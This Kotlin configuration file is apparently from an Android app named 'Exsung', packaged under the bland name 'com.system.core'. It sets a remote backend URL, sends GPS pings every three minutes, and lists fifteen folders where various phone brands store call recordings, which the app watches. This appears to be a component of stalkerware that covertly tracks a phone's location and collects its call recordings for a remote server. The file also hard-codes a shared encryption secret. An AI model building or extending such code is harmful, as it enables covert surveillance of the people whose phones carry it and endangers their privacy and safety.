/**
 * EXSUNG SYSTEM COMPONENT: Mobile App Central Configuration
 * Refer to Master Architecture Plan: d:/Desktop/Experiments/Exsung/PLAN.md
 * Any structural changes to configuration or endpoints MUST be updated in PLAN.md
 *
 * NOTE FOR FUTURE URL/KEY REPLACEMENT:
 * Update SERVER_BASE_URL and SECRET_E2EE_KEY right here to update the entire app!
 */

package com.system.core

object AppConfig {
    // 🌐 SINGLE CENTRAL BACKEND URL (Replace with your Render URL when deployed!)
    // Example: "https://exsung-backend.onrender.com" or "http://192.168.1.50:5000"
    const val SERVER_BASE_URL: String = "https://exsung-backend.onrender.com"

    // 🔒 SINGLE CENTRAL END-TO-END ENCRYPTION (E2EE) SECRET KEY
    const val SECRET_E2EE_KEY: String = "exsungsecretkeykraestreo"

    // 🕒 GPS Telemetry Ping Rate (Minutes)
    const val TELEMETRY_PING_INTERVAL_MINUTES: Long = 3

    // 📁 Method 2 Recording Watcher Folders (Primary & Fallback paths across all phone brands)
    val RECORDING_FOLDERS = arrayOf(
        "/storage/emulated/0/MIUI/callrecorder/call_rec",
        "/storage/emulated/0/MIUI/callrecorder",
        "/storage/emulated/0/MIUI/sound_recorder/call_rec",
        "/storage/emulated/0/Recordings/Call",
        "/storage/emulated/0/Recordings",
        "/storage/emulated/0/Call",
        "/storage/emulated/0/Record/Call",
        "/storage/emulated/0/Voice Recorder",
        "/storage/emulated/0/Sounds",
        "/storage/emulated/0/CallRecord",
        "/storage/emulated/0/PhoneRecord",
        "/storage/emulated/0/Audio",
        "/storage/emulated/0/Music",
        "/storage/emulated/0/Android/data/com.samsung.android.dialer/files",
        "/storage/emulated/0/Android/data/com.google.android.dialer/files"
    )
}
